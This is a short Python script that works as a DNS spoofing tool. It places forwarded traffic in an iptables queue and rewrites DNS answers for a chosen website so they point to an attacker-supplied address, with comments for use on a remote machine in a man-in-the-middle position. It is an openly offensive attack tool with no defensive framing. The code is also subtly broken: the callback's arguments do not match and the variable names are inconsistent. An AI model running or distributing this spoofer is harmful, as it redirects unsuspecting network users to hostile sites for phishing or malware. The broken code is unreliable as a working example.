#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-s", "--spoof", dest="spoof_website", help="Specify a website to spoof")
parser.add_argument("-r", "--redirect", dest="rd_website", help="Specify a website to redirect the user")
options = parser.parse_args()


def process_packet(packet, option):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if option.spoof_website in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.rd_website)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()

try:
    # For use on local machine
    # subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    # subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)

    # For use on remote machine
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
